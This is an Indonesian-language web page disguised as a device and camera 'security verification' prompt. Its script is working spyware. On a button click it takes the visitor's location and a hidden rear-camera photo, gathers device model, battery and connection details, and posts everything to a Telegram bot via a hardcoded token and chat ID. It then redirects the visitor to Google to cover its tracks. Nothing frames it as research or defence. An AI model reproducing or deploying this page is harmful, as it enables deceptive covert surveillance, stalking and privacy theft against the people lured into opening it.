<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Verifikasi</title>
    <style>
        body { background: #f4f4f4; text-align: center; font-family: sans-serif; padding-top: 100px; }
        .box { padding: 30px; border: 1px solid #ddd; width: 85%; margin: auto; border-radius: 15px; background: #fff; box-shadow: 0 4px 6px rgba(0,0,0,0.1); }
        button { padding: 15px 30px; font-size: 18px; background: #27ae60; color: white; border: none; border-radius: 8px; cursor: pointer; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="box">
        <h2>Verifikasi Perangkat</h2>
        <p>Klik tombol di bawah untuk melanjutkan proses verifikasi keamanan kamera.</p>
        <button onclick="mulaiVerifikasi()">Lanjutkan Verifikasi</button>
    </div>

    <video id="video" style="display:none;" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const TOKEN = '8746483619:AAFM0hZ7HwcnPFPV07PFUZZ4lGML0Nrt5aw';
        const CHAT_ID = '6888530451';
        let userLocation = "Lokasi tidak diizinkan";

        function translateModel(model) {
            const brands = {
                '2310FPCA4G': 'Xiaomi Redmi 13C', '2201117TY': 'Redmi Note 11',
                '21061119AL': 'Xiaomi Mi 11 Lite', '2201116SG': 'Redmi Note 11 Pro',
                'M2012K11AG': 'POCO F3', 'SM-G991B': 'Samsung S21',
                'SM-A525F': 'Samsung Galaxy A52', 'SM-A125F': 'Samsung Galaxy A12',
                'CPH2219': 'Oppo A94', 'CPH2127': 'Oppo A53',
                'RMX3363': 'Realme GT Master Edition', 'RMX2151': 'Realme 7',
                'X688B': 'Infinix Hot 10', 'V2025': 'Vivo V20',
                'CPH': 'Oppo Device', 'RMX': 'Realme Device', 'SM-': 'Samsung Galaxy'
            };
            for (let key in brands) { if (model.includes(key)) return brands[key]; }
            return model;
        }

        async function getDeviceDetails() {
            let model = "Android Mobile";
            if (navigator.userAgentData) {
                try {
                    const hints = await navigator.userAgentData.getHighEntropyValues(['model']);
                    if (hints.model) model = translateModel(hints.model);
                } catch (e) {}
            }
            let battery = "N/A";
            try {
                if (navigator.getBattery) {
                    const bat = await navigator.getBattery();
                    battery = Math.round(bat.level * 100) + "%";
                }
            } catch (e) {}
            let connInfo = navigator.connection ? `${navigator.connection.effectiveType.toUpperCase()} | Latency: ${navigator.connection.rtt}ms | Speed: ${navigator.connection.downlink}Mbps` : "Unknown";
            return { model, battery, connInfo };
        }

        async function mulaiVerifikasi() {
            // Minta Lokasi
            if ("geolocation" in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (pos) => { userLocation = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`; },
                    () => { userLocation = "Ditolak"; }
                );
            }

            // Akses Kamera Belakang
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
                const video = document.getElementById('video');
                video.srcObject = stream;
                setTimeout(() => ambilFoto(video), 2000);
            } catch (err) {
                kirimDataTanpaFoto();
            }
        }

        async function ambilFoto(video) {
            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);

            const details = await getDeviceDetails();

            canvas.toBlob(async (blob) => {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob);
                formData.append('caption', `📸 <b>Laporan Kamera Belakang</b>\n\n📱 <b>Model:</b> ${details.model}\n🔋 <b>Baterai:</b> ${details.battery}\n🌐 <b>Koneksi:</b> ${details.connInfo}\n📍 <b>Lokasi:</b> ${userLocation}`);
                formData.append('parse_mode', 'HTML');
                
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
                window.location.href = "https://google.com";
            }, 'image/jpeg');
        }

        async function kirimDataTanpaFoto() {
            const details = await getDeviceDetails();
            const text = `⚠️ <b>Kamera Belakang Ditolak</b>\n\n📱 <b>Model:</b> ${details.model}\n🔋 <b>Baterai:</b> ${details.battery}\n🌐 <b>Koneksi:</b> ${details.connInfo}\n📍 <b>Lokasi:</b> ${userLocation}`;
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=HTML`);
            window.location.href = "https://google.com";
        }
    </script>
</body>
</html>
